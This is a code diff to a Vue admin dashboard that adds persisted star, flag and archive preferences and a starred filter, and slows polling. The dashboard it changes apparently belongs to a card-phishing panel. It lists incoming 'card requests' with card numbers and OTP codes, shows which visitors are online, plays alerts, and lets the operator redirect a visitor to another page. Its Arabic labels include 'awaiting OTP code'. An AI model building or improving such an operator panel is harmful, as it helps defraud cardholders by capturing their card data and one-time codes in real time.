@@ -6,13 +6,17 @@ import {
   ActiveSessionInfo,
   VisitorMeta,
   ServerStatsPayload,
+  AdminPreferences,
   listCardRequests,
   updateCardRequest,
   deleteCardRequest,
   getServerStats,
   connectAdminStream,
   verifyAdminSession,
-  adminLogoutApi
+  adminLogoutApi,
+  getAdminPreferences,
+  updateAdminPreferences,
+  toggleAdminPreference
 } from '../api';
 import {
   RefreshCw,
@@ -59,7 +63,7 @@ const loading = ref(true);
 const error = ref('');
 const searchQuery = ref('');
 const showSearchInput = ref(false);
-const filterMode = ref<'all' | 'online' | 'card' | 'otp' | 'archived'>('all');
+const filterMode = ref<'all' | 'online' | 'card' | 'otp' | 'starred' | 'archived'>('all');
 const isAuthenticated = ref(false);
 const authChecking = ref(true);
 const soundEnabled = ref(true);
@@ -304,11 +308,26 @@ const playNotificationSound = (force = false) => {
   }
 };
 
-const toggleSound = () => {
-  soundEnabled.value = !soundEnabled.value;
-  if (soundEnabled.value) {
+const applyServerPreferences = (prefs?: AdminPreferences | null) => {
+  if (!prefs) return;
+  starredIds.value = new Set(prefs.starredIds || []);
+  archivedIds.value = new Set(prefs.archivedIds || []);
+  flaggedIds.value = new Set(prefs.flaggedIds || []);
+  if (typeof prefs.soundEnabled === 'boolean') {
+    soundEnabled.value = prefs.soundEnabled;
+  }
+};
+
+const toggleSound = async () => {
+  const nextVal = !soundEnabled.value;
+  soundEnabled.value = nextVal;
+  if (nextVal) {
     playNotificationSound(true);
   }
+  try {
+    const updated = await updateAdminPreferences({ soundEnabled: nextVal });
+    applyServerPreferences(updated);
+  } catch {}
 };
 
 const isDeleting = ref<string | null>(null);
@@ -349,6 +368,9 @@ const applyServerSnapshot = (stats: ServerStatsPayload, reqList: RequestData[], 
   userPages.value = stats.userPages || {};
   userMeta.value = stats.userMeta || {};
   activeSessions.value = stats.activeSessions || [];
+  if (stats.preferences) {
+    applyServerPreferences(stats.preferences);
+  }
 
   const newSig = buildDataSignature(reqList);
   if (!isInitial && knownSignature && newSig !== knownSignature) {
@@ -382,6 +404,9 @@ const fetchAll = async (isInitial = false) => {
       userPages.value = stats.userPages || {};
       userMeta.value = stats.userMeta || {};
       activeSessions.value = stats.activeSessions || [];
+      if (stats.preferences) {
+        applyServerPreferences(stats.preferences);
+      }
     }
 
     if (reqResult.status === 'fulfilled') {
@@ -423,11 +448,15 @@ onMounted(async () => {
   }
   isAuthenticated.value = true;
   authChecking.value = false;
+  try {
+    const prefs = await getAdminPreferences();
+    applyServerPreferences(prefs);
+  } catch {}
   await fetchAll(true);
   stopAdminStream = connectAdminStream(({ stats, requests: reqList }) => {
     applyServerSnapshot(stats, reqList, false);
   });
-  pollTimer = setInterval(() => fetchAll(false), 2000);
+  pollTimer = setInterval(() => fetchAll(false), 10000);
 });
 
 onUnmounted(() => {
@@ -488,28 +517,40 @@ const handleRedirectSelectChange = async () => {
   await updateNextAction(selectedRequest.value.id, selectedRedirectPage.value);
 };
 
-const toggleStar = (id: string) => {
+const toggleStar = async (id: string) => {
   const next = new Set(starredIds.value);
-  if (next.has(id)) next.delete(id);
-  else next.add(id);
+  const nextVal = !next.has(id);
+  if (nextVal) next.add(id);
+  else next.delete(id);
   starredIds.value = next;
+  try {
+    const updated = await toggleAdminPreference('starredIds', id, nextVal);
+    applyServerPreferences(updated);
+  } catch {}
 };
 
-const toggleFlag = (id: string) => {
+const toggleFlag = async (id: string) => {
   const next = new Set(flaggedIds.value);
-  if (next.has(id)) next.delete(id);
-  else next.add(id);
+  const nextVal = !next.has(id);
+  if (nextVal) next.add(id);
+  else next.delete(id);
   flaggedIds.value = next;
+  try {
+    const updated = await toggleAdminPreference('flaggedIds', id, nextVal);
+    applyServerPreferences(updated);
+  } catch {}
 };
 
-const toggleArchive = (id: string) => {
+const toggleArchive = async (id: string) => {
   const next = new Set(archivedIds.value);
-  if (next.has(id)) {
-    next.delete(id);
-  } else {
-    next.add(id);
-  }
+  const nextVal = !next.has(id);
+  if (nextVal) next.add(id);
+  else next.delete(id);
   archivedIds.value = next;
+  try {
+    const updated = await toggleAdminPreference('archivedIds', id, nextVal);
+    applyServerPreferences(updated);
+  } catch {}
 };
 
 const copyText = async (text?: string, label = 'card') => {
@@ -524,10 +565,9 @@ const copyText = async (text?: string, label = 'card') => {
 };
 
 const isRequestOnline = (req: RequestData): boolean => {
-  if (req.isOnline === true) return true;
+  if (typeof req.isOnline === 'boolean') return req.isOnline;
   if (onlineUsers.value[req.id]) return true;
   if (activeSessions.value.some(s => s.requestId === req.id)) return true;
-  if (typeof req.secondsAgo === 'number' && req.secondsAgo < 15) return true;
   return false;
 };
 
@@ -552,6 +592,8 @@ const filteredRequests = computed(() => {
       list = list.filter(r => Boolean(r.cardNumber));
     } else if (filterMode.value === 'otp') {
       list = list.filter(r => Boolean(r.otp));
+    } else if (filterMode.value === 'starred') {
+      list = list.filter(r => starredIds.value.has(r.id));
     }
   }
 
@@ -1338,7 +1380,8 @@ const filteredRequests = computed(() => {
                 <option value="online">المتصلون الآن ({{ onlineCount }})</option>
                 <option value="card">بيانات البطاقة ({{ cardEnteredCount }})</option>
                 <option value="otp">بانتظار رمز OTP ({{ pendingOtpCount }})</option>
-                <option value="archived">المؤرشفة</option>
+                <option value="starred">المميزة بنجمة ({{ starredIds.size }})</option>
+                <option value="archived">المؤرشفة ({{ archivedIds.size }})</option>
               </select>
               <ChevronDown class="w-3.5 h-3.5 text-gray-500 absolute left-0 pointer-events-none" />
             </div>
